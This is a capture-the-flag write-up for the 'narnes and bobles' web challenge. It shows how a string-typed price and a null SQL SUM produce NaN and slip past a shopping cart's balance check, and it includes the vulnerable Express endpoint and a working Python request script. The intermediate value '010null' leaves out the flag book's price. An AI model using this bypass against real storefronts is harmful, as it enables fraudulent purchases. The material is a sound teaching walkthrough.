## narnes and bobles  

<img src="images/chall.png" width=600>

We are given a webapp that allows us to purchases books, as well as preview book samples. The backend mainly uses Bun SQL for data storage.  

In `books.json`, we can see that there is a flag book that costs `$1000000`, but the problem is that our account is initialised with only `$1000`.  

We can also notice that the `price` attribute of the first book is a string. This will come in handy later.  

```json
[
 {
    "id": "a3e33c2505a19d18",
    "title": "The Part-Time Parliament",
    "file": "part-time-parliament.pdf",
    "price": "10"
  },
  {
    "id": "509d8c2a80e495fb",
    "title": "The End of Cryptography",
    "file": "end_of_cryptography.txt",
    "price": 20
  },
  {
    "id": "f4838abd731caf29",
    "title": "AVDestroyer Origin Lore",
    "file": "avd_origin_lore.txt",
    "price": 40
  },
  {
    "id": "2a16e349fb9045fa",
    "title": "Flag",
    "file": "flag.txt",
    "price": 1000000
  }
]
```

The main vulnerability lies in the `/cart/add` endpoint, as the only thing stopping us from purchasing the flag book is the `(additionalSum + cartSum > balance)` check.  

This can be bypassed by adding book `a3e33c2505a19d18`, then the flag book to our cart. By default, Bun SQL will return `null` when `SUM()` is called on zero records.  

This means that if our cart is empty, `cartSum` will be `null`. Normally, this wouldn't be an issue, since the server assumes `additionalSum` is a number, which means the sum of `additionalSum` and `null` will be coerced to an integer.  

However, when we purchase book `a3e33c2505a19d18`, `.reduce()` will concatenate `additionalSum` as a string into `010null`, which will be coerced to `NaN` in the balance check. `NaN` is not bigger or smaller than any number, so the balance check will always fail, and the flag book will be added to our cart.  

```js
app.post('/cart/add', needsAuth, async (req, res) => {
  const productsToAdd = req.body.products;
  if (!Array.isArray(productsToAdd) || productsToAdd.length === 0) {
    return res.json({ err: 'please add a product to cart' });
  }

  const [{ balance }] = await db`SELECT balance FROM users WHERE username=${res.locals.username}`;
  const [{ cartSum }] = await db`
    SELECT SUM(books.price) AS cartSum
    FROM cart_items
    JOIN books ON books.id = cart_items.book_id
    WHERE cart_items.username = ${res.locals.username} AND cart_items.is_sample = 0
  `;
  const additionalSum = productsToAdd
    .filter((product) => !+product.is_sample)
    .map((product) => booksLookup.get(product.book_id).price ?? 99999999)
    .reduce((l, r) => l + r, 0);

  if (additionalSum + cartSum > balance) {
    return res.json({ err: 'too poor, have you considered geting more money?' })
  }
  const cartEntries = productsToAdd.map((prod) => ({ ...prod, username: res.locals.username }));
  await db`INSERT INTO cart_items ${db(cartEntries)}`;
  res.json({ remainingBalance: balance - cartSum - additionalSum });
});
```

After adding the books to our cart and checking out, the server will return the books as a zip archive, which we can extract to read `flag.txt`.  

```python
s = requests.Session()

res = s.post(f'{url}/cart/add', json={
  "products": [
    {
        "book_id": "a3e33c2505a19d18",
        "is_sample": 0
    },
    {
        'book_id': '2a16e349fb9045fa',
        'is_sample': 0
    }
  ]
})

res = s.post(f'{url}/cart/checkout')

with open("flag.zip", "wb") as f:
    f.write(res.content)
```

Flag: `lactf{matcha_dubai_chocolate_labubu}`